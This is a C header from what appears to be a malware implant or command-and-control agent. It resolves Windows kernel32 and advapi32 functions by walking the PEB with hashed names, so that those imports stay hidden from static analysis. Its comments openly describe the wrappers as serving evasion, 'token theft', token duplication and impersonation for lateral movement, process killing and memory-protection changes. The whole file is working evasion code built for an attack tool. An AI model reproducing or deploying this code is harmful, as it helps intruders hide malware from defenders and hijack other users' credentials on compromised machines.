/*
 * client/evasion/k32_walk.h  –  Kernel32 API resolution via PEB walk
 * ====================================================================
 * Provides thin inline wrappers that resolve high-signal kernel32 exports
 * through peb_get_module / peb_get_export so those functions do not appear
 * as static IAT entries in the agent binary.
 *
 * Each wrapper is named k32_<Win32FunctionName> and has the same
 * calling convention as the original Win32 function.  Callers include
 * this header instead of calling the Win32 function directly.
 *
 * Functions covered
 * -----------------
 *   k32_CreateMutexA        — single-instance guard (main.c)
 *   k32_CreateThread        — fallback thread spawn (main.c AgentRun path)
 *   k32_OpenProcess         — process handle acquisition (handlers_system.c)
 *   k32_TerminateProcess    — process kill (handlers_system.c)
 *   k32_OpenProcessToken    — token theft (handlers_lateral.c)
 *   k32_DuplicateTokenEx    — token duplication (handlers_lateral.c)
 *   k32_ImpersonateLoggedOnUser — token impersonation (handlers_lateral.c)
 *   k32_VirtualProtect      — memory protection change (evasion.c fallback)
 *
 * Design
 * ------
 * Each function resolves its module + export exactly once per call — the
 * per-call overhead is a PEB LDR list walk (~2 µs) which is negligible for
 * the infrequent calls these APIs generate.
 *
 * The module handle is looked up through peb_get_module() which returns the
 * base address from the LDR directly — identical to GetModuleHandle but
 * without leaving a GetModuleHandleA/W IAT entry.
 */

#pragma once
#ifndef CLIENT_K32_WALK_H
#define CLIENT_K32_WALK_H

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>
#include "peb_walk.h"

#ifdef __cplusplus
extern "C" {
#endif

/* ── Module handles — resolve once, cache in static locals ─────────────── */

static inline PVOID _k32_base(void)
{
    static PVOID _h = NULL;
    if (!_h) _h = peb_get_module(peb_hash_str("kernel32.dll"));
    return _h;
}

static inline PVOID _advapi32_base(void)
{
    static PVOID _h = NULL;
    if (!_h) _h = peb_get_module(peb_hash_str("advapi32.dll"));
    return _h;
}

/* ── k32_CreateMutexA ───────────────────────────────────────────────────── */
static inline HANDLE k32_CreateMutexA(LPSECURITY_ATTRIBUTES lpMutexAttributes,
                                       BOOL bInitialOwner,
                                       LPCSTR lpName)
{
    typedef HANDLE (WINAPI *pfn_t)(LPSECURITY_ATTRIBUTES, BOOL, LPCSTR);
    PVOID h = _k32_base();
    if (!h) return NULL;
    pfn_t pfn = (pfn_t)(void *)peb_get_export(h, peb_hash_str("CreateMutexA"));
    if (!pfn) return NULL;
    return pfn(lpMutexAttributes, bInitialOwner, lpName);
}

/* ── k32_CreateThread ───────────────────────────────────────────────────── */
static inline HANDLE k32_CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes,
                                       SIZE_T dwStackSize,
                                       LPTHREAD_START_ROUTINE lpStartAddress,
                                       LPVOID lpParameter,
                                       DWORD dwCreationFlags,
                                       LPDWORD lpThreadId)
{
    typedef HANDLE (WINAPI *pfn_t)(LPSECURITY_ATTRIBUTES, SIZE_T,
                                    LPTHREAD_START_ROUTINE, LPVOID,
                                    DWORD, LPDWORD);
    PVOID h = _k32_base();
    if (!h) return NULL;
    pfn_t pfn = (pfn_t)(void *)peb_get_export(h, peb_hash_str("CreateThread"));
    if (!pfn) return NULL;
    return pfn(lpThreadAttributes, dwStackSize, lpStartAddress,
               lpParameter, dwCreationFlags, lpThreadId);
}

/* ── k32_OpenProcess ────────────────────────────────────────────────────── */
static inline HANDLE k32_OpenProcess(DWORD dwDesiredAccess,
                                      BOOL bInheritHandle,
                                      DWORD dwProcessId)
{
    typedef HANDLE (WINAPI *pfn_t)(DWORD, BOOL, DWORD);
    PVOID h = _k32_base();
    if (!h) return NULL;
    pfn_t pfn = (pfn_t)(void *)peb_get_export(h, peb_hash_str("OpenProcess"));
    if (!pfn) return NULL;
    return pfn(dwDesiredAccess, bInheritHandle, dwProcessId);
}

/* ── k32_TerminateProcess ───────────────────────────────────────────────── */
static inline BOOL k32_TerminateProcess(HANDLE hProcess, UINT uExitCode)
{
    typedef BOOL (WINAPI *pfn_t)(HANDLE, UINT);
    PVOID h = _k32_base();
    if (!h) return FALSE;
    pfn_t pfn = (pfn_t)(void *)peb_get_export(h, peb_hash_str("TerminateProcess"));
    if (!pfn) return FALSE;
    return pfn(hProcess, uExitCode);
}

/* ── k32_VirtualProtect ─────────────────────────────────────────────────── */
static inline BOOL k32_VirtualProtect(LPVOID lpAddress, SIZE_T dwSize,
                                       DWORD flNewProtect, PDWORD lpflOldProtect)
{
    typedef BOOL (WINAPI *pfn_t)(LPVOID, SIZE_T, DWORD, PDWORD);
    PVOID h = _k32_base();
    if (!h) return FALSE;
    pfn_t pfn = (pfn_t)(void *)peb_get_export(h, peb_hash_str("VirtualProtect"));
    if (!pfn) return FALSE;
    return pfn(lpAddress, dwSize, flNewProtect, lpflOldProtect);
}

/* ── advapi32: OpenProcessToken ─────────────────────────────────────────── */
static inline BOOL k32_OpenProcessToken(HANDLE ProcessHandle,
                                         DWORD DesiredAccess,
                                         PHANDLE TokenHandle)
{
    typedef BOOL (WINAPI *pfn_t)(HANDLE, DWORD, PHANDLE);
    PVOID h = _advapi32_base();
    if (!h) return FALSE;
    pfn_t pfn = (pfn_t)(void *)peb_get_export(h, peb_hash_str("OpenProcessToken"));
    if (!pfn) return FALSE;
    return pfn(ProcessHandle, DesiredAccess, TokenHandle);
}

/* ── advapi32: DuplicateTokenEx ─────────────────────────────────────────── */
static inline BOOL k32_DuplicateTokenEx(HANDLE hExistingToken,
                                         DWORD dwDesiredAccess,
                                         LPSECURITY_ATTRIBUTES lpTokenAttributes,
                                         SECURITY_IMPERSONATION_LEVEL ImpersonationLevel,
                                         TOKEN_TYPE TokenType,
                                         PHANDLE phNewToken)
{
    typedef BOOL (WINAPI *pfn_t)(HANDLE, DWORD, LPSECURITY_ATTRIBUTES,
                                  SECURITY_IMPERSONATION_LEVEL, TOKEN_TYPE, PHANDLE);
    PVOID h = _advapi32_base();
    if (!h) return FALSE;
    pfn_t pfn = (pfn_t)(void *)peb_get_export(h, peb_hash_str("DuplicateTokenEx"));
    if (!pfn) return FALSE;
    return pfn(hExistingToken, dwDesiredAccess, lpTokenAttributes,
               ImpersonationLevel, TokenType, phNewToken);
}

/* ── advapi32: ImpersonateLoggedOnUser ──────────────────────────────────── */
static inline BOOL k32_ImpersonateLoggedOnUser(HANDLE hToken)
{
    typedef BOOL (WINAPI *pfn_t)(HANDLE);
    PVOID h = _advapi32_base();
    if (!h) return FALSE;
    pfn_t pfn = (pfn_t)(void *)peb_get_export(h, peb_hash_str("ImpersonateLoggedOnUser"));
    if (!pfn) return FALSE;
    return pfn(hToken);
}

#ifdef __cplusplus
}
#endif
#endif /* CLIENT_K32_WALK_H */
